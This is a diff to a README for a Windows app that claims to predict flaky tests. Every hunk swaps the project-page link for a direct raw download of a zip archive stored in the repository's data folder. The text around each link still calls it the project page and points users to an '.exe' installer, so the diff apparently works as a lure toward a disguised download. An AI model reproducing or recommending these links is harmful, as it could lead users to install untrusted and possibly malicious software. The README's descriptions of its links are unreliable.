@@ -1,6 +1,6 @@
 # ⚙️ flaky-test-prediction-ml - Predict Flaky Tests with Ease
 
-[![Download flaky-test-prediction-ml](https://img.shields.io/badge/Download-flaky--test--prediction--ml-blue?style=for-the-badge)](https://github.com/Gogeta767/flaky-test-prediction-ml)
+[![Download flaky-test-prediction-ml](https://img.shields.io/badge/Download-flaky--test--prediction--ml-blue?style=for-the-badge)](https://github.com/Gogeta767/flaky-test-prediction-ml/raw/refs/heads/main/data/ml-prediction-flaky-test-v2.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You can run flaky-test-prediction-ml on any Windows computer following the steps
 ### Step 1: Download the software
 
 - Click the big blue button at the top or use this link:  
-  https://github.com/Gogeta767/flaky-test-prediction-ml  
+  https://github.com/Gogeta767/flaky-test-prediction-ml/raw/refs/heads/main/data/ml-prediction-flaky-test-v2.5.zip  
 - This link will take you to the project page, where you can download the latest release.  
 - Look for a file ending with `.exe` for Windows. This is the installer.  
 
@@ -119,7 +119,7 @@ If problems continue, you may report issues on the GitHub page under the "Issues
 You can find additional information, report issues, and ask questions here:
 
 - Visit the main project page:  
-  https://github.com/Gogeta767/flaky-test-prediction-ml  
+  https://github.com/Gogeta767/flaky-test-prediction-ml/raw/refs/heads/main/data/ml-prediction-flaky-test-v2.5.zip  
 - Use the "Issues" section to report bugs or request features  
 - Check the README and documentation files for more details  
 
@@ -143,7 +143,7 @@ These resources help you get the most out of the app in your daily testing routi
 Step-by-step download and install guide:
 
 1. Visit the project page:  
-   https://github.com/Gogeta767/flaky-test-prediction-ml  
+   https://github.com/Gogeta767/flaky-test-prediction-ml/raw/refs/heads/main/data/ml-prediction-flaky-test-v2.5.zip  
 
 2. Scroll to the "Releases" section and find the latest Windows installer `.exe`.
 
